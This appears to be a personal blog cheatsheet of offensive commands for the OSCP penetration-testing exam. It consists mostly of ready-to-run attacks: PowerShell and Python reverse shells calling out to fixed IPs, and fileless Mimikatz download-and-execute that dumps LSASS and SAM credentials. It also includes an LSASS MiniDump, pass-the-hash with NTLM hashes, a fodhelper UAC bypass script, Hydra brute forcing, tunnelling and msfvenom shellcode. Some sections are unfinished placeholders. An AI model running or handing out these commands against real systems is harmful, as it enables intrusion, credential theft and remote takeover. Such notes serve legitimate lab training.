---
layout: post
title: OSCP commands cheatsheet
---

# Enumeration

## Nmap

```bash
# service version
sudo nmap --min-rate 100 -sV -sC -T4 $ip -oA nmap/versions  

# all ports
sudo nmap --min-rate 100 -T4 -p- $ip -Pn -oA nmap/all

# service version on specific ports
sudo nmap --min-rate 100 -T4 $ip -Pn -p30021,33033,44330,45332,45443 -sC -sV 
```

`nmapAutomator.sh -H $ip -t vulns`
`nmapAutomator.sh -H $ip -t all`

## Web

```bash
dirsearch -u http://192.168.113.58 -x 403,400,404 -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -R 2 -e php
```

## SMB

```bash
nmap -p139,445 --script smb-vuln-* $IP
nmap -p139,445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP

smbmap -H $IP
smbmap -H $IP -u anonymous
smbmap [-L] [-r] -H $IP -u $username -p $password -d $workgroup
smbmap -H $IP -R --depth 5

smbclient -L $IP
smbclient //$IP/tmp
smbclient \\\\$IP\\ipc$ -U $username 
smbclient //$IP/ipc$ -U $username

mount -t cifs //$IP/$shared_folder $mount_folder
```

# Reverse shell

PowerShell revshell one liner
```powershell
powershell.exe -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.210',443);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

Meterpreter listener setup in one line
```bash
# Meterpreter
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 443; run; exit -y"
# Java
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD java/jsp_shell_reverse_tcp; set LHOST tun0; set LPORT 443; run; exit -y"
```

Escaping quotes
```bash
"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.118.6\",15672));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
```

# File transfer

## Windows

**SMB server** on Linux
`sudo impacket-smbserver data .`

On Windows shell
`copy \\192.168.119.250\workgroup\test.bat`
Can upload and download from Windows this way.

**FTP**
Start FTP server `python3 -m pyftpdlib -w -p 21

```bash
# Recursively download whole ftp directories
wget -m --no-parent --no-passive ftp://username:password@IP
```

## Linux
curl/wget

If firewall blocks HTTP connections and we have a low-priv shell, generate SSH keys and use scp.

Firewall rules preventing file transfer, so generated SSH keys on the target and added to the Kali authorized keys file. Then we can transfer files with scp e.g.
```bash 
scp -i /var/lib/postgresql/.ssh/id_rsa kali@192.168.49.171:/home/kali/Documents/oscp/provingGrounds/nibbles/linpeas.sh /tmp/
```

# Tools
## Hydra

HTTP-Post-Form
`sudo hydra -l dj -P /usr/share/wordlists/rockyou.txt 10.11.1.128 -s 4167 http-post-form "/loginform.asp:uname=^USER^&psw=^PASS^:Internal server error."`


# Credential Dumping
## Mimikatz

Fileless execution via PowerShell
```powershell
IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.119.151/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'
```

Transferring Mimikatz binary via PowerShell
```powershell
(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.250/mimikatz.exe', 'C:\Users\Administrator\Documents\mk.exe')
```

## Secretsdump

Remotely dump credentials using NTLM hash of administrator to authenticate to target.
```
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:08df3c73ded940e1f2bcf5eea4b8dbf6 bob@10.11.1.1
```

## Rundll32 MiniDump

MiniDump is a useful technique to have in the back of your mind in case any issues arise with Mimikatz (some versions do not work on newer Windows machines). This outputs a DMP file to Temp. This can be processed with `pypykatz` locally on the attacking machine.

First we need to find the PID of `lsass.exe`:

```
```

Then we can execute MiniDump.
```powershell
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [PID] C:\temp\out.dmp full
```

Transfer DMP via Netcat.

```powershell
WIP
```

Use pypykatz.
```bash
WIP
```

## Task Manager

Remember if all else fails and we have RDP access to the target machine, we can dump the process memory of LSASS from Task Manager. 

## Pass the hash

RDP
`xfreerdp /u:nicky /d:thinc /pth:b40c7060e1bf68227131564a1bf33d48 /v:10.11.1.223`

# Pivoting 
## Port forwarding
SSH
```bash
ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
ssh -D 127.0.0.1:9050 -N [username]@[ip]
proxychains ifconfig
```

Netsh on pivot machine
```powershell
netsh interface portproxy add v4tov4 listenport=443 listenaddress=172.16.143.10 connectport=443 connectaddress=192.168.119.143
```

Plink
```bash
plink.exe 10.1.1.1 -P 22 -C -N -L 0.0.0.0:4445:10.1.1.1:4443 -l KALIUSER -pw PASS

plink.exe -ssh -l newuser -pw test -R 192.168.119.143:1234:127.0.0.1:3306 192.168.119.143

# dynamic
plink.exe 10.1.1.1 -P 22 -C -N -D 1080 -l KALIUSER -pw PASS

# forward 445 on target to 444 on Kali
plink.exe -l root x.x.x.x -R 444:127.0.0.1:445
```

SSH over HTTP
```bash
# At target: open port 80 and redirect incoming traffic from port 80 to port 22 (ssh service)
hts -F localhost:22 x.x.x.x:80
# At client: start a tunnel on a random local port 6969 which is bound at port 80:
htc.exe -F 6969 x.x.x.x:80
# At client: log in via SSH:
ssh -p 6969 localhost
```

Chisel
```bash
# server (kali)
./chisel server -p 8000 --reverse --socks5
# Create SOCKS5 listener on 1080 on Kali, proxy through client
chisel.exe client 10.10.14.3:8000 R:socks
# specify port (add to proxychains config)
chisel.exe client 10.10.14.3:8000 R:5000:socks
```

# Internal Reconnaissance

Check for unquoted service paths
```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```
Check service
```powershell
sc qc FoxitCloudUpdateService
```
Check if writable
```powershell
icacls "C:\Program Files (x86)\Foxit Software\Foxit Reader"
cacls "C:\Program Files (x86)\Foxit Software\Foxit Reader"
```

Check for plaintext passwords
```
reg query HKLM /f pass /t REG_SZ /s
```

## UAC Bypass

Fodhelper and Eventvwr (check SVcorp notes) 

```powershell
where /r C:\Windows fodhelper.exe
```

```powershell
#This UAC bypass tries to execute your command with elevated privileges using fodhelper.exe

$yourevilcommand = "C:\Windows\System32\cmd.exe"

#Adding all the reistry required with your command.

New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $yourevilcommand -Force

#Starts the fodhelper process to execute your command.

Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

#Cleaning up the mess created.
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

# Buffer overflow

```bash
msf-pattern_create -l $length
msf-pattern_offset -l $length -q $EIP
```

```bash
# keep the same order of outputs
msf-nasm_shell
   nasm > jmp esp
   00000000  FFE4              jmp esp

# select a dll module
!mona modules

# find address of "jmp esp"
!mona find -s "\xff\xe4" -m "libspp.dll"

# find "pop,pop,ret" for SEH
!mona seh -m "$module"

# generate Windows reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f c -e x86/shikata_ga_nai -b "\x00"
```

Compile Windows exploit on Kali
```bash
# 64-bit
x86_64-w64-mingw32-gcc shell.c -o shell.exe

# 32-bit
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

# Miscellaneous
Path not set 

Windows
```
set PATH=%SystemRoot%\system32;%SystemRoot%;
```
Linux
```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
